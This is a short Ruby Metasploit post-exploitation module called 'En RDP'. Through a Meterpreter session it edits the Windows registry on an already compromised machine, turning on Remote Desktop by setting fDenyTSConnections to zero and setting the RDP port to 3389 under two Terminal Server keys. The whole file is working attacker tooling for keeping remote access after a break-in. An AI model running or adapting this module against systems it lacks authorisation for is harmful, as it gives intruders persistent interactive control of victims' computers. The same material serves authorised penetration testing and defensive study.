require 'rex'
require 'msf/core/post/windows/registry'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  def initialize
    super(
    'Name'        => 'En RDP',
    'Description'         => 'This Module Modify Registor To Enable RDP',
    'License'        => MSF_LICENSE,
    'Author'        => 'OWL'
     )
  end

  def run
  key_rdp_serv = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
  key_rdp_port = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp"
  key_wintcp_port = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"
  exists_rdp_serv = meterpreter_registry_key_exist?(key_rdp_serv)
  if not exists_rdp_serv
  print_error("Key RDP_Serv Dosen't Exist,Creating Key")
  registry_createkey(key_rdp_serv)
  print_status("Setting value")
  meterpreter_registry_setvaldata(key_rdp_serv,'fDenyTSConnections','00000000','REG_DWORD',REGISTRY_VIEW_64_BIT)
  print_good("OK! Modified RDP_Serv!")
  else
  print_status("Key_rdp_serv Exist,Creating Values")
  meterpreter_registry_setvaldata(key_rdp_serv,'fDenyTSConnections','00000000','REG_DWORD',REGISTRY_VIEW_64_BIT)
  print_good("OK! Modified RDP_Serv!")
  end
  exists_rdp_port= meterpreter_registry_key_exist?(key_rdp_port)
  if not exists_rdp_port
  print_status("Key RDP_Port Dosen't Exist,Creating Key")
  registry_createkey(key_rdp_port)
  print_status("Setting RPD Port Value")
  meterpreter_registry_setvaldata(key_rdp_port,'PortNumber','00000d3d','REG_DWORD',REGISTRY_VIEW_64_BIT)
  print_good("OK! Modified rpd_port!")
  else
  print_status("Key_rdp_port Exist,Creating Values")
  print_status("Setting RPD Port Value")
  meterpreter_registry_setvaldata(key_rdp_port,'PortNumber','00000d3d','REG_DWORD',REGISTRY_VIEW_64_BIT)
  print_good("OK! Modified rpd_port!")
  end
  exists_wintcp_port= meterpreter_registry_key_exist?(key_wintcp_port)
  if not exists_wintcp_port
  print_status("Key RDP_Port Dosen't Exist,Creating Key")
  registry_createkey(key_wintcp_port)
  print_status("Setting Win TCP Port Value")
  meterpreter_registry_setvaldata(key_wintcp_port,'PortNumber','00000d3d','REG_DWORD',REGISTRY_VIEW_64_BIT)
  print_good("OK! Modified wintcp_port!")
  else
  print_status("Key_wintcp_port Exist,Creating Values")
  print_status("Setting Win TCP Port Value")
  meterpreter_registry_setvaldata(key_wintcp_port,'PortNumber','00000d3d','REG_DWORD',REGISTRY_VIEW_64_BIT)
  print_good("OK! Modified wintcp_port!")
  end
  end
  end


